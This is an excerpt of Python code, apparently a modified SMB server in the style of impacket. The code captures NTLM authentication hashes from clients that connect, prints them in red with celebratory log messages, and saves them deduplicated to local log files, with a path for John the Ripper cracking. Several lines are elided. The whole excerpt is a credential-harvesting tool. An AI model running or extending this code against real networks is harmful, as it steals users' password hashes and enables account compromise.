        ...
        if SMBCommand['WordCount'] == 12:
            ...
            if messageType == 0x01:
                ...
                if errorCode == STATUS_SUCCESS:
                    ...
                    smbServer.log('User %s\\%s authenticated HELL YEAH successfully' % (authenticateMessage['user_name'], authenticateMessage['host_name']))
                    # Let's store it in the connection data
                    ...
                    try:
                        ...
                        smbServer.log("yo " + ntlm_hash_data['hash_string'] + " yo")
            ...
            smbServer.log('User %s\\%s authenticated FYEAH successfully (basic)' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account']))
            try:
                jtr_dump_path = smbServer.getJTRdumpPath()
        ...
        if messageType == 0x01:
            ...
            if errorCode == STATUS_SUCCESS:
                ...
                try:
                    ...
                    smbServer.log(Fore.RED + ntlm_hash_data['hash_string'] + Style.RESET_ALL)
                    f = open("logs/hashes.log", "a+")
                    uniq = open("logs/hash_unique.log", "r")
                    ...
                    for hash_str in uniq:
                        s_hash_id = str(hash_str.split(":")[0] + "::" + hash_str.split("::")[1].split(":")[0])
                        hash_ids.append(s_hash_id)

                    uniq.close()

                    hash_id = str(ntlm_hash_data["hash_string"].split(":")[0] + "::" + ntlm_hash_data["hash_string"].split("::")[1].split(":")[0])

                    if hash_id in hash_ids:
                        smbServer.log("Skipping existing hash")
                    else:
                        smbServer.log("Saving hash to file")
                        uniq2 = open("logs/hash_unique.log", "a+")
                        uniq2.write(ntlm_hash_data["hash_string"] + "\n")
                        uniq2.close
